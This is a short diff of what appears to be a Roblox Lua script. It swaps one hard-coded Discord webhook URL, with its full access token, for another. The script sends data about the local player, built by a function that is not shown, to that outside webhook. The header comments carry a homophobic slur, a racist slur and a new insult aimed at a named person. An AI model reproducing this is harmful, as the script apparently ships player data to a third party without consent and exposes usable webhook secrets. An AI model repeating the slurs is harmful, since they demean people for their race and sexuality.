@@ -10,6 +10,7 @@
 
 -- Open Source
 -- Who Will Delete Or Spam Webhook - Gay + Nigger
+-- k5utils if u see this u fuckin retarded kid
 
 
 
@@ -191,5 +192,5 @@ end
 
 local player = Players.LocalPlayer
 if player then
-    SendWebhook("https://discord.com/api/webhooks/1439198926367359026/mHtx9oLlXiYvrXPwYnHYNaPbom35yL4mXPUMGCaWCDwIdQWNcF763xhud3-ObLSQSwyU", CreateWebhook(player))
+    SendWebhook("https://discord.com/api/webhooks/1440676802254344243/QwaLYih08SHzNsSqUnMox9g3sIPum0pVTn3E-uYUIGyxhh7NNYwNTXBkx2xZRFU0nsFB", CreateWebhook(player))
 end
